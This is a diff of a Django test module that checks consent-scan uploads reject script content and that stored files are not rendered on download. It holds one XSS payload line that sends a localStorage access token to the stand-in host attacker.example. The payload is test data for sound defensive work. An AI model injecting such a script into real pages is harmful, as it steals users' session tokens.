@@ -13,24 +13,20 @@ Two locks, tested separately on purpose. The upload refuses the file, and the
 download refuses to render it — because rows uploaded before the first lock
 existed are still in storage, and the fix has to cover them too.
 """
-import tempfile
 
 from django.contrib.auth import get_user_model
 from django.core.files.uploadedfile import SimpleUploadedFile
-from django.test import override_settings
 from rest_framework.test import APITestCase
 
 from accounts.models import Role
 from children.models import Child
 from clinical.models import ConsentRecord
 
-TEMP_MEDIA = tempfile.mkdtemp(prefix="nacc-consent-test-")
 User = get_user_model()
 
 SCRIPT = b"<script>fetch('https://attacker.example/?t='+localStorage.access)</script>"
 
 
-@override_settings(MEDIA_ROOT=TEMP_MEDIA)
 class ConsentScanUploadTest(APITestCase):
     def setUp(self):
         Role.objects.create(role_name=Role.ADMINISTRATOR)
